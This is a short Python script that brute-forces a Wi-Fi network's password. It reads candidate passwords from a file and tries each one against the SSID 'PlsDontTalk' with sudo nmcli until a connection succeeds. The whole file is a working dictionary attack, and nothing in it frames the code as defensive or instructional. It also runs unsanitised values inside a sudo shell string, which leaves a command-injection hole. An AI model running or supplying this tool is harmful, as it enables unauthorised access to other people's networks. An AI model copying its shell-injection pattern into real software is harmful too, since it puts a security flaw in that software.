import subprocess
import asyncio

async def connection(essid, password):
    connect_command = f'sudo nmcli device wifi connect "{essid}" password "{password}"'
    process = await asyncio.create_subprocess_shell(
        connect_command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    try:
        await asyncio.wait_for(process.wait(), timeout=0.7335)
        if process.returncode == 0:
            print(f"Successfully connected to network '{essid}' with password '{password}'.")
            return True
        else:
            print(f"Connection attempt with password '{password}' failed.")
            return False
    except asyncio.TimeoutError:
        print(f"Connection attempt with password '{password}' timed out.")
        return False

async def main():
    ssid = "PlsDontTalk"
    
    with open("passwords.txt", "r") as file:
        passwords = file.read().splitlines()

    for password in passwords:
        if await connection(ssid, password):
            break

# Run the asyncio event loop
asyncio.run(main())
